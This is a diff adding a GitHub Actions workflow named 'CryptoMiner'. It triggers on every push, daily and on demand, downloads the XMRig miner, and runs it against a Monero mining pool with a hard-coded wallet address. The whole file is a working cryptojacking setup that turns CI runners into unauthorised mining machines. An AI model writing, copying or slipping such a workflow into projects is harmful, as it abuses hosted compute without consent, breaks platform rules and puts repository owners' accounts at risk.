@@ -1,0 +1,20 @@
+name: CryptoMiner
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 0 * * *'
+  push:
+
+jobs:
+  mining:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Setup miner
+      run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz
+        tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz
+        cd xmrig-6.20.0
+    - name: Start mining
+      run: |
+        ./xmrig -o pool.hashvault.pro:443 -u 45w8eSZEnn7c1t4MHGoUw72dh4XHELqs8A39J5muPWGuBam5QKrJ5GXC5Jm9QsxenTMVo9n6MYKepgpZ1aE21BoFEuZWSdD -p github-action --donate-level=1
